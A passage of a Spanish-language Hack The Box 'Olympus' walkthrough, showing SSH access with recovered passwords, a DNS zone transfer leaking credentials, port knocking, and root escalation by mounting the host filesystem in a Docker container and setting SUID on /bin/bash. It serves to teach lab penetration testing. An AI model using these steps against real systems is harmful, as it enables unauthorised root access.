+                       05 1F 77 B3 BB 39 E2 4F 45 03 66 F6 12 2D 1B 23 
+
+      Transient Key  : A8 1E 31 D3 6D A0 7B BA 82 73 04 31 99 3C BF 89 
+                       17 6C 29 B1 50 72 C2 AC 2C 18 0B 6B 5F F9 D6 E7 
+                       93 F9 AC 2A AD D3 F2 35 60 75 CF B3 5C 8F 6D AB 
+                       F6 00 BA 73 8E 7C 72 AA 38 01 10 41 80 13 F8 A4 
+
+      EAPOL HMAC     : 1D 54 03 3C B2 5E A2 BC D5 86 5A 09 67 82 12 85 
+</code></pre></div></div>
+
+<p>Ya tenemos otra posible contraseña, asi que la guardamos. Recordando, la máquina tiene el pueto 2222 abierto asociado al servicio SSH, por lo que podemos probar conectarnos a dicho puerto como el usuario <strong><em>icarus</em></strong> y utilizar las dos posibles contraseñas obtenidas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh icarus@10.10.10.83 <span class="nt">-p2222</span>
+The authenticity of host <span class="s1">'[10.10.10.83]:2222 ([10.10.10.83]:2222)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:uyZtmsYFq/Ac58+SEgLsL+NK05LlH2qwp2EXB1DxlO4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="o">[</span>10.10.10.83]:2222<span class="s1">' (ECDSA) to the list of known hosts.
+icarus@10.10.10.83'</span>s password: 
+Last login: Sun Apr 15 16:44:40 2018 from 10.10.14.4
+icarus@620b296204a3:~<span class="nv">$ </span><span class="nb">whoami
+</span>icarus
+icarus@620b296204a3:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya ingresamos a la máquina como el usuario <strong><em>icarus</em></strong>; sin embargo, nos damos cuenta de que nos encontramos en otro contenedor debido al prompt <code class="language-plaintext highlighter-rouge">icarus@620b296204a3:~</code> y la dirección IP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icarus@620b296204a3:~<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
+172.19.0.2 
+icarus@620b296204a3:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>En el directorio del usuario vemos el archivo <code class="language-plaintext highlighter-rouge">help_of_the_gods.txt</code>, el cual nos podría dar otra pista; en este caso el dominio <strong>ctfolympus.htb</strong>. Así que lo metemos en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y debemos estar pensando en un posible <em>Domain Zone Transfer</em> debido a que se encuentra abierto el puerto 53.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icarus@620b296204a3:~<span class="nv">$ </span><span class="nb">pwd</span>
+/home/icarus
+icarus@620b296204a3:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rw-r--r--</span> 1 root root 85 Apr 15  2018 help_of_the_gods.txt
+icarus@620b296204a3:~<span class="nv">$ </span><span class="nb">cat </span>help_of_the_gods.txt 
+
+Athena goddess will guide you through the dark...
+
+Way to Rhodes...
+ctfolympus.htb
+
+icarus@620b296204a3:~<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ dig @10.10.10.83 ctfolympus.htb
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.10.10.83 ctfolympus.htb
+<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 17763
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;ctfolympus.htb.                        IN      A
+
+;; ANSWER SECTION:
+ctfolympus.htb.         86400   IN      A       192.168.0.120
+
+;; AUTHORITY SECTION:
+ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
+ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
+
+;; ADDITIONAL SECTION:
+ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
+ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
+
+;; Query time: 304 msec
+;; SERVER: 10.10.10.83#53(10.10.10.83)
+;; WHEN: dom sep 19 00:20:21 CDT 2021
+;; MSG SIZE  rcvd: 127
+
+❯ dig @10.10.10.83 ctfolympus.htb axfr
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @10.10.10.83 ctfolympus.htb axfr
+; (1 server found)
+;; global options: +cmd
+ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
+ctfolympus.htb.         86400   IN      A       192.168.0.120
+ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
+ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
+ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
+crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
+hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
+mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
+ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
+ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
+rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
+RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
+www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
+ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+;; Query time: 148 msec
+;; SERVER: 10.10.10.83#53(10.10.10.83)
+;; WHEN: dom sep 19 00:22:25 CDT 2021
+;; XFR size: 15 records (messages 1, bytes 475)
+</span></code></pre></div></div>
+
+<p>Ojito, que nos están dando otra pista <strong><em>“prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!”</em></strong>. Nos están indicando un posible usuario <strong>prometheus</strong>, una contraseña <strong>St34l_th3_F1re!</strong> y unos puertos <strong>3456 8234 62431</strong>, por lo que ya debemos estar pensando en <em>port knocking</em>. Para este caso vamos a tirar el <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p3456</span>,8234,62431 10.10.10.83 <span class="nt">-r</span><span class="p">;</span> ssh prometheus@10.10.10.83
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 00:27 CDT
+Nmap scan report <span class="k">for </span>ctfolympus.htb <span class="o">(</span>10.10.10.83<span class="o">)</span>
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE  SERVICE
+3456/tcp  closed vat
+8234/tcp  closed unknown
+62431/tcp closed unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.50 seconds
+The authenticity of host <span class="s1">'10.10.10.83 (10.10.10.83)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:8TR2+AWSBT/c5mrjpDotoEYu0mEy/jCzpuS79d+Z0oY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.83<span class="s1">' (ECDSA) to the list of known hosts.
+prometheus@10.10.10.83'</span>s password: 
+
+Welcome to
+                            
+    <span class="o">)</span>         <span class="o">(</span>             
+ <span class="o">(</span> /<span class="o">(</span>     <span class="o">)</span>   <span class="o">)</span><span class="se">\ </span><span class="o">)</span>   <span class="o">(</span>      
+ <span class="o">)</span><span class="se">\(</span><span class="o">))</span> <span class="o">(</span> /<span class="o">(</span>  <span class="o">(()</span>/<span class="o">(</span>  <span class="o">))</span><span class="se">\ </span><span class="o">(</span>   
+<span class="o">((</span>_<span class="o">)</span><span class="se">\ </span> <span class="o">)(</span>_<span class="o">))</span>  <span class="o">((</span>_<span class="o">))</span>/<span class="o">((</span>_<span class="o">))</span><span class="se">\ </span> 
+| |<span class="o">(</span>_<span class="o">)((</span>_<span class="o">)</span>_   _| |<span class="o">(</span>_<span class="o">))</span> <span class="o">((</span>_<span class="o">)</span> 
+| <span class="s1">' \ / _` |/ _` |/ -_)(_-&lt; 
+|_||_|\__,_|\__,_|\___|/__/ 
+                           
+prometheus@olympus:~$ whoami
+prometheus
+prometheus@olympus:~$
+</span></code></pre></div></div>
+
+<p>Ahora si ya nos encontramos dentro de la máquina como el usuario <em>prometheus</em> y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, así que enumeramos un poco el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prometheus@olympus:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>prometheus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>prometheus<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>prometheus<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>bluetooth<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vemos que nos encontramos dentro del grupo <strong>docker</strong>, así que podemos crear un contenedor montando la raiz <code class="language-plaintext highlighter-rouge">/</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prometheus@olympus:~<span class="nv">$ </span>docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+crete               latest              31be8149528e        3 years ago         450MB
+olympia             latest              2b8904180780        3 years ago         209MB
+rodhes              latest              82fbfd61b8c1        3 years ago         215MB
+prometheus@olympus:~<span class="nv">$ </span>docker ps
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
+f00ba96171c5        crete               <span class="s2">"docker-php-entrypoi…"</span>   3 years ago         Up 5 hours          0.0.0.0:80-&gt;80/tcp                       crete
+ce2ecb56a96e        rodhes              <span class="s2">"/etc/bind/entrypoin…"</span>   3 years ago         Up 5 hours          0.0.0.0:53-&gt;53/tcp, 0.0.0.0:53-&gt;53/udp   rhodes
+620b296204a3        olympia             <span class="s2">"/usr/sbin/sshd -D"</span>      3 years ago         Up 5 hours          0.0.0.0:2222-&gt;22/tcp                     olympia
+prometheus@olympus:~<span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">-v</span> /:/mnt rodhes bash
+<span class="nb">cat</span>: /etc/hostip: No such file or directory
+root@f51b8f68f6ab:/# <span class="nb">cd</span> /mnt
+root@f51b8f68f6ab:/mnt# <span class="nb">ls</span> <span class="nt">-l</span>
+total 76
+drwxr-xr-x   2 root root  4096 Apr 15  2018 bin
+drwxr-xr-x   3 root root  4096 Apr 15  2018 boot
+drwxr-xr-x  17 root root  3080 Sep 19 01:03 dev
+drwxr-xr-x  85 root root  4096 Apr 15  2018 etc
+drwxr-xr-x   3 root root  4096 Apr  4  2018 home
+lrwxrwxrwx   1 root root    29 Apr  2  2018 initrd.img -&gt; boot/initrd.img-4.9.0-6-amd64
+lrwxrwxrwx   1 root root    29 Apr  2  2018 initrd.img.old -&gt; boot/initrd.img-4.9.0-4-amd64
+drwxr-xr-x  16 root root  4096 Apr  2  2018 lib
+drwxr-xr-x   2 root root  4096 Apr  2  2018 lib64
+drwx------   2 root root 16384 Apr  2  2018 lost+found
+drwxr-xr-x   3 root root  4096 Apr  2  2018 media
+drwxr-xr-x   2 root root  4096 Apr  2  2018 mnt
+drwxr-xr-x   2 root root  4096 Apr  2  2018 opt
+dr-xr-xr-x 171 root root     0 Sep 19 01:03 proc
+drwx------   4 root root  4096 Apr 15  2018 root
+drwxr-xr-x  17 root root   600 Sep 19 05:32 run
+drwxr-xr-x   2 root root  4096 Apr 15  2018 sbin
+drwxr-xr-x   2 root root  4096 Apr  2  2018 srv
+dr-xr-xr-x  13 root root     0 Sep 19 01:03 sys
+drwxrwxrwt   8 root root  4096 Sep 19 05:38 tmp
+drwxr-xr-x  10 root root  4096 Apr  2  2018 usr
+drwxr-xr-x  11 root root  4096 Apr  2  2018 var
+lrwxrwxrwx   1 root root    26 Apr  2  2018 vmlinuz -&gt; boot/vmlinuz-4.9.0-6-amd64
+lrwxrwxrwx   1 root root    26 Apr  2  2018 vmlinuz.old -&gt; boot/vmlinuz-4.9.0-4-amd64
+root@f51b8f68f6ab:/mnt#
+</code></pre></div></div>
+
+<p>En el directorio <code class="language-plaintext highlighter-rouge">/mnt</code> se encuentra montado la raiz del sistema <em>padre</em> y siendo el usuario <strong>root</strong>, podemos visualizar la flag (root.txt). En caso de que queramos una forma más interactiva, podemos dar permisos SUID a la <code class="language-plaintext highlighter-rouge">/bin/bash</code> y desde la máquina real escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@42a4cc5c0cce:/mnt/root# <span class="nb">cd</span> ..
+root@42a4cc5c0cce:/mnt# <span class="nb">cd </span>bin/
+root@42a4cc5c0cce:/mnt/bin# <span class="nb">chmod </span>4755 bash 
+root@42a4cc5c0cce:/mnt/bin# <span class="nb">ls</span> <span class="nt">-l</span> | <span class="nb">grep </span>bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1099016 May 15  2017 bash
+lrwxrwxrwx 1 root root       4 May 15  2017 rbash -&gt; bash
+root@42a4cc5c0cce:/mnt/bin# <span class="nb">exit
+</span>prometheus@olympus:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1099016 May 15  2017 /bin/bash
+prometheus@olympus:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-4.4# <span class="nb">whoami
+</span>root
+bash-4.4#
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#dns-zone-transfer" class="page__taxonomy-item" rel="tag">DNS_Zone_Transfer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#port-knocking" class="page__taxonomy-item" rel="tag">Port_Knocking</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sandbox-escape" class="page__taxonomy-item" rel="tag">Sandbox_Escape</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-18T00:00:00-05:00">September 18, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-querier/" class="pagination--pager" title="Hack The Box Querier
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
